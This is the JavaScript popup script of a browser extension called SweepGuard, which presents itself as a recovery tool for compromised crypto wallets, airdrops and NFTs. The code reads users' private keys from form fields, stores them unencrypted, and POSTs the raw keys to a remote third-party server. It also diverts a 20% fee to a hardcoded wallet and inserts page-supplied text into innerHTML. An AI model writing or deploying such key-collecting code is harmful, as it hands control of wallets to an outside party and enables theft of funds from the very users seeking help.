// SweepGuard Extension - Popup Script v2.1
// Handles UI interactions and communicates with content scripts

const API_BASE = 'https://sweeptsguard.vercel.app';
const FEE_WALLET = '0x7A3725154a2E6468F9549334394802e9E2822C2A';
const FEE_PERCENT = 20;

// State
let selectedChain = 1;
let selectedFeeMode = 'medium';
let gasPrices = {};
let currentPageInfo = null;
let wallets = {
  hackedKey: '',
  safeWallet: '',
  sponsorKey: ''
};

// Gas fee multipliers
const FEE_MULTIPLIERS = {
  slow: 0.8,
  medium: 1.0,
  aggressive: 1.5
};

// Chain-specific gas settings
const CHAIN_GAS = {
  1: { name: 'Ethereum', symbol: 'ETH', avgGas: 30, unit: 'Gwei' },
  8453: { name: 'Base', symbol: 'ETH', avgGas: 0.001, unit: 'Gwei' },
  56: { name: 'BSC', symbol: 'BNB', avgGas: 3, unit: 'Gwei' },
  42161: { name: 'Arbitrum', symbol: 'ETH', avgGas: 0.1, unit: 'Gwei' },
  137: { name: 'Polygon', symbol: 'MATIC', avgGas: 50, unit: 'Gwei' },
  10: { name: 'Optimism', symbol: 'ETH', avgGas: 0.01, unit: 'Gwei' },
  43114: { name: 'Avalanche', symbol: 'AVAX', avgGas: 25, unit: 'nAVAX' },
  250: { name: 'Fantom', symbol: 'FTM', avgGas: 100, unit: 'Gwei' },
  81457: { name: 'Blast', symbol: 'ETH', avgGas: 0.001, unit: 'Gwei' },
  324: { name: 'zkSync', symbol: 'ETH', avgGas: 0.1, unit: 'Gwei' },
  59144: { name: 'Linea', symbol: 'ETH', avgGas: 0.1, unit: 'Gwei' },
  11155111: { name: 'Sepolia', symbol: 'ETH', avgGas: 20, unit: 'Gwei' }
};

// Initialize
document.addEventListener('DOMContentLoaded', async () => {
  await loadSavedData();
  setupTabs();
  setupChainGrid();
  setupFeeModeGrid();
  setupButtons();
  setupToggles();
  await getCurrentPageInfo();
  await fetchGasPrices(selectedChain);
});

// Load saved wallet data from storage
async function loadSavedData() {
  try {
    const result = await chrome.storage.local.get(['wallets', 'settings']);
    if (result.wallets) {
      wallets = result.wallets;
      document.getElementById('hackedKey').value = wallets.hackedKey || '';
      document.getElementById('safeWallet').value = wallets.safeWallet || '';
      document.getElementById('sponsorKey').value = wallets.sponsorKey || '';
    }
  } catch (e) {
    console.log('No saved data');
  }
}

// Get current page info from content script
async function getCurrentPageInfo() {
  try {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (tab) {
      document.getElementById('currentUrl').textContent = tab.url || 'Unknown page';
      
      // Try to get info from content script
      try {
        const response = await chrome.tabs.sendMessage(tab.id, { type: 'GET_PAGE_INFO' });
        if (response) {
          currentPageInfo = response;
          updatePageStatus(response);
        }
      } catch (e) {
        console.log('Content script not responding');
      }
    }
  } catch (e) {
    console.log('Could not get page info');
  }
}

// Update page status display
function updatePageStatus(info) {
  const statusEl = document.getElementById('pageStatus');
  const urlEl = document.getElementById('currentUrl');
  
  if (info.isClaimPage) {
    statusEl.className = 'page-status detected';
    urlEl.innerHTML = `🎯 Claim page detected! <br>${info.url || ''}`;
  } else {
    statusEl.className = 'page-status';
    urlEl.textContent = info.url || 'Unknown page';
  }
  
  // Update connected wallet display
  if (info.connectedWallet) {
    document.getElementById('connectedWallet').textContent = 
      `Connected: ${info.connectedWallet.slice(0, 10)}...${info.connectedWallet.slice(-8)}`;
  }
}

// Tab switching
function setupTabs() {
  document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', () => {
      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
      
      tab.classList.add('active');
      document.getElementById(`tab-${tab.dataset.tab}`).classList.add('active');
    });
  });
}

// Chain grid selection
function setupChainGrid() {
  document.querySelectorAll('.chain-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.chain-btn').forEach(b => b.classList.remove('selected'));
      btn.classList.add('selected');
      selectedChain = parseInt(btn.dataset.chain);
      fetchGasPrices(selectedChain);
    });
  });
}

// Fee mode grid selection
function setupFeeModeGrid() {
  document.querySelectorAll('.fee-mode-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.fee-mode-btn').forEach(b => b.classList.remove('selected'));
      btn.classList.add('selected');
      selectedFeeMode = btn.dataset.mode;
      updateFeeDisplay();
    });
  });
}

// Fetch gas prices from API
async function fetchGasPrices(chainId) {
  try {
    const response = await fetch(`${API_BASE}/api/gas?chainId=${chainId}`);
    const data = await response.json();
    
    if (data.gasPrices) {
      gasPrices = data.gasPrices;
      updateFeeDisplay();
    } else {
      const chain = CHAIN_GAS[chainId];
      if (chain) {
        gasPrices = {
          slow: chain.avgGas * 0.8,
          medium: chain.avgGas,
          aggressive: chain.avgGas * 1.5
        };
        updateFeeDisplay();
      }
    }
  } catch (e) {
    const chain = CHAIN_GAS[chainId];
    if (chain) {
      gasPrices = {
        slow: chain.avgGas * 0.8,
        medium: chain.avgGas,
        aggressive: chain.avgGas * 1.5
      };
      updateFeeDisplay();
    }
  }
}

// Update fee display
function updateFeeDisplay() {
  const chain = CHAIN_GAS[selectedChain];
  if (!chain) return;

  const slowPrice = gasPrices.slow || chain.avgGas * 0.8;
  const mediumPrice = gasPrices.medium || chain.avgGas;
  const aggressivePrice = gasPrices.aggressive || chain.avgGas * 1.5;

  document.getElementById('feeSlow').textContent = `${slowPrice.toFixed(4)} ${chain.unit}`;
  document.getElementById('feeMedium').textContent = `${mediumPrice.toFixed(4)} ${chain.unit}`;
  document.getElementById('feeAggressive').textContent = `${aggressivePrice.toFixed(4)} ${chain.unit}`;

  let selectedPrice;
  switch (selectedFeeMode) {
    case 'slow': selectedPrice = slowPrice; break;
    case 'medium': selectedPrice = mediumPrice; break;
    case 'aggressive': selectedPrice = aggressivePrice; break;
    default: selectedPrice = mediumPrice;
  }

  const gasLimit = 200000;
  let costInEth;
  if (chain.unit === 'Gwei') {
    costInEth = (selectedPrice * gasLimit) / 1e9;
  } else if (chain.unit === 'nAVAX') {
    costInEth = (selectedPrice * gasLimit) / 1e9;
  } else {
    costInEth = (selectedPrice * gasLimit) / 1e18;
  }

  document.getElementById('estimatedCost').textContent = `~${costInEth.toFixed(6)} ${chain.symbol}`;
}

// Button handlers
function setupButtons() {
  document.getElementById('claimBtn').addEventListener('click', handleClaim);
  document.getElementById('transferBtn').addEventListener('click', handleTransfer);
  document.getElementById('nftBtn').addEventListener('click', handleNFT);
  document.getElementById('saveBtn').addEventListener('click', saveConfig);
  document.getElementById('clearBtn').addEventListener('click', clearConfig);
  document.getElementById('connectPageBtn').addEventListener('click', connectToPage);
}

// Connect to current page
async function connectToPage() {
  try {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (tab) {
      // Try to connect via content script
      try {
        await chrome.tabs.sendMessage(tab.id, { type: 'CONNECT_WALLET' });
        showNotification('Wallet connection requested!');
      } catch (e) {
        // If content script not responding, inject and try
        await chrome.scripting.executeScript({
          target: { tabId: tab.id },
          func: () => {
            if (window.ethereum) {
              window.ethereum.request({ method: 'eth_requestAccounts' });
            }
          }
        });
        showNotification('Wallet connection requested!');
      }
    }
  } catch (e) {
    showNotification('Could not connect to page');
  }
}

// Toggle handlers
function setupToggles() {
  document.querySelectorAll('.toggle').forEach(toggle => {
    toggle.addEventListener('click', () => {
      toggle.classList.toggle('active');
    });
  });
}

// Handle claim
async function handleClaim() {
  const hackedKey = document.getElementById('hackedKey').value;
  const safeWallet = document.getElementById('safeWallet').value;
  const sponsorKey = document.getElementById('sponsorKey').value;
  
  if (!hackedKey || !safeWallet || !sponsorKey) {
    showResult('claimResults', 'error', 'Please fill all wallet fields');
    return;
  }
  
  const btn = document.getElementById('claimBtn');
  btn.disabled = true;
  btn.innerHTML = '<span class="loading"></span> Claiming...';
  
  try {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    
    // Try to detect claim page
    let claimContract = null;
    try {
      const results = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: () => {
          const text = document.body.innerText;
          const addressRegex = /0x[a-fA-F0-9]{40}/g;
          return text.match(addressRegex) || [];
        }
      });
      
      if (results && results[0]?.result?.length > 0) {
        claimContract = results[0].result[0];
      }
    } catch (e) {}
    
    if (!claimContract) {
      showResult('claimResults', 'error', 'No claim contract detected. Navigate to an airdrop page first.');
      btn.disabled = false;
      btn.innerHTML = '🎯 Claim Airdrop — 80% to Safe Wallet';
      return;
    }
    
    // Call SweepGuard API
    const response = await fetch(`${API_BASE}/api/airdrop/claim`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        contractAddress: claimContract,
        chainId: selectedChain,
        claimMethod: 'claimSimple',
        recipientAddress: safeWallet,
        privateKey: sponsorKey,
        useFeeCollector: true,
        mode: 'claimFromAnyWallet',
        feeMode: selectedFeeMode,
        gasPrice: gasPrices[selectedFeeMode] || gasPrices.medium
      })
    });
    
    const data = await response.json();
    
    if (data.results && data.results[0]?.success) {
      showResult('claimResults', 'success', 
        `Claimed! TX: ${data.results[0].txHash?.slice(0, 16)}...`,
        `80% → ${safeWallet.slice(0, 8)}... | 20% → Fee Wallet`
      );
    } else {
      showResult('claimResults', 'error', data.error || 'Claim failed');
    }
  } catch (e) {
    showResult('claimResults', 'error', e.message);
  }
  
  btn.disabled = false;
  btn.innerHTML = '🎯 Claim Airdrop — 80% to Safe Wallet';
}

// Handle transfer
async function handleTransfer() {
  const hackedKey = document.getElementById('hackedKey').value;
  const safeWallet = document.getElementById('safeWallet').value;
  const sponsorKey = document.getElementById('sponsorKey').value;
  const tokenAddress = document.getElementById('tokenAddress').value;
  const amount = document.getElementById('transferAmount').value;
  
  if (!hackedKey || !safeWallet || !sponsorKey) {
    showResult('transferResults', 'error', 'Please fill all wallet fields in Claim tab');
    return;
  }
  
  const btn = document.getElementById('transferBtn');
  btn.disabled = true;
  btn.innerHTML = '<span class="loading"></span> Transferring...';
  
  try {
    const response = await fetch(`${API_BASE}/api/recover`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        action: 'recover',
        privateKey: hackedKey,
        safeAddress: safeWallet,
        sponsorPrivateKey: sponsorKey,
        chainId: selectedChain,
        tokenAddress: tokenAddress || undefined,
        amount: amount || 'all',
        feeMode: selectedFeeMode,
        gasPrice: gasPrices[selectedFeeMode] || gasPrices.medium
      })
    });
    
    const data = await response.json();
    
    if (data.success) {
      showResult('transferResults', 'success',
        `Transfer complete! TX: ${data.txHashes?.[0]?.slice(0, 16)}...`,
        `Tokens sent to ${safeWallet.slice(0, 8)}...`
      );
    } else {
      showResult('transferResults', 'error', data.error || 'Transfer failed');
    }
  } catch (e) {
    showResult('transferResults', 'error', e.message);
  }
  
  btn.disabled = false;
  btn.innerHTML = '💸 Transfer to Safe Wallet';
}

// Handle NFT claim
async function handleNFT() {
  const hackedKey = document.getElementById('hackedKey').value;
  const sponsorKey = document.getElementById('sponsorKey').value;
  const nftContract = document.getElementById('nftContract').value;
  const nftRecipient = document.getElementById('nftRecipient').value;
  
  if (!hackedKey || !sponsorKey || !nftContract || !nftRecipient) {
    showResult('nftResults', 'error', 'Please fill all fields');
    return;
  }
  
  const btn = document.getElementById('nftBtn');
  btn.disabled = true;
  btn.innerHTML = '<span class="loading"></span> Claiming NFT...';
  
  try {
    const response = await fetch(`${API_BASE}/api/recover`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        action: 'recover',
        privateKey: hackedKey,
        safeAddress: nftRecipient,
        sponsorPrivateKey: sponsorKey,
        chainId: selectedChain,
        nftContract: nftContract,
        isNFT: true,
        feeMode: selectedFeeMode,
        gasPrice: gasPrices[selectedFeeMode] || gasPrices.medium
      })
    });
    
    const data = await response.json();
    
    if (data.success) {
      showResult('nftResults', 'success',
        `NFT claimed! TX: ${data.txHashes?.[0]?.slice(0, 16)}...`,
        `NFT sent to ${nftRecipient.slice(0, 8)}... (0% fee)`
      );
    } else {
      showResult('nftResults', 'error', data.error || 'NFT claim failed');
    }
  } catch (e) {
    showResult('nftResults', 'error', e.message);
  }
  
  btn.disabled = false;
  btn.innerHTML = '🖼️ Claim NFT to Safe Wallet';
}

// Save configuration
async function saveConfig() {
  wallets = {
    hackedKey: document.getElementById('hackedKey').value,
    safeWallet: document.getElementById('safeWallet').value,
    sponsorKey: document.getElementById('sponsorKey').value
  };
  
  await chrome.storage.local.set({ wallets });
  showNotification('Configuration saved!');
}

// Clear configuration
async function clearConfig() {
  await chrome.storage.local.clear();
  
  document.getElementById('hackedKey').value = '';
  document.getElementById('safeWallet').value = '';
  document.getElementById('sponsorKey').value = '';
  
  wallets = { hackedKey: '', safeWallet: '', sponsorKey: '' };
  showNotification('All data cleared');
}

// Show result
function showResult(containerId, type, message, details) {
  const container = document.getElementById(containerId);
  container.innerHTML = `
    <div class="result-item ${type}">
      <div class="result-header">
        <span class="result-chain">${type === 'success' ? '✅' : '❌'} ${message}</span>
        <span class="result-status ${type}">${type}</span>
      </div>
      ${details ? `<div class="result-tx">${details}</div>` : ''}
    </div>
  `;
}

// Show notification
function showNotification(message) {
  chrome.notifications.create({
    type: 'basic',
    iconUrl: 'icons/icon128.png',
    title: 'SweepGuard',
    message: message
  });
}
